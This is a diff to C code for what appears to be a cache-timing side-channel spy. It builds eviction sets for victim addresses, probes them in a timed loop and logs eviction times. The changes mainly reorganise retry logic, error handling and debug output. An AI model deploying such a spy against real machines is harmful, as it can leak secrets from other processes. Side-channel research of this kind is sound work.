@@ -130,13 +130,15 @@ Targets *init_spy(Config *spy_conf, char *target_filepath, char *offset_target){
     Targets *targets = load_targets(target_filepath, offset_target);
     
 no_evset:
-    for(size_t i=0; i<targets->number; i++){
-        targets->addresses[i]->evset = find_evset(spy_conf, targets->addresses[i]->adrs);
+    for(size_t i=0; i<targets->number; i++) targets->addresses[i]->evset = find_evset(spy_conf, targets->addresses[i]->adrs);
+    for(size_t i=0; i<targets->number; i++) if(targets->addresses[i]->evset==NULL) return NULL;
+    for(size_t i=0; i<targets->number; i++) { 
+        // restart find evset if no eviction set was found
+        if(*(targets->addresses[i]->evset)==NULL) goto no_evset;
+        printf("%lu, %lx, %p\n", i, targets->addresses[i]->offset, targets->addresses[i]->evset);
+        list_print(targets->addresses[i]->evset);
         targets->addresses[i]->msrmts = malloc(MSRMT_BUFFER*sizeof(uint64_t));
-    }  
-    // oopsie  
-    for(size_t i=0; i<targets->number; i++) if(targets->addresses[i]->evset==NULL) goto no_evset;
-
+    }
     // Make sure output file exists.
     const char *output_filename = "./output_evict_time.log";
     create_empty_file(output_filename);
@@ -174,11 +176,8 @@ void my_monitor(Config *spy_conf, Targets *targets){
         unsigned long long old_tsc, tsc;
         __asm__ __volatile__ ("rdtscp" : "=A" (tsc));
 
-        // Print information on first iteration.
-        int first=targets->number;
-
         // wait 3000*no. of targets, eviction takes ~1900 cycles
-        unsigned long long diff = 3000*first;
+        unsigned long long diff = 3000*targets->number;
         while(1){
             old_tsc=tsc;
             __asm__ __volatile__ ("rdtscp" : "=A" (tsc));
@@ -191,8 +190,6 @@ void my_monitor(Config *spy_conf, Targets *targets){
 
             // evict
             for(size_t i=0; i<targets->number; i++){
-                if(first>0) printf("%lu, %lx, %p\n", i, targets->addresses[i]->offset, targets->addresses[i]->evset);
-                if(first-->0) list_print(targets->addresses[i]->evset);
                 probe_evset_chase(spy_conf, targets->addresses[i]->evset);
                 // Maybe toggle during actual attack.
             }        
@@ -220,6 +217,10 @@ void my_monitor(Config *spy_conf, Targets *targets){
 void spy(char *victim_filepath, char *offset_filepath){
     Config *spy_conf= config_init(16, 2048, 64, 110, 2097152);
     Targets *targets = init_spy(spy_conf, victim_filepath, offset_filepath);
+    if (targets==NULL) {
+        printf("[!] spy: init spy failed, abort!\n");
+        return;
+    }
     printf("[+] spy: spy init complete, monitoring");
     for(size_t i=0; i<targets->number; i++){
         printf(" %p", targets->addresses[i]->adrs);
@@ -230,8 +231,10 @@ void spy(char *victim_filepath, char *offset_filepath){
         }
     }
     printf(" now...\n");
+    for(size_t i=0; i<targets->number; i++) list_print(targets->addresses[i]->evset);
     my_monitor(spy_conf, targets);
 }
+
 
 int main(int ac, char **av){  
     if(ac!=3) {
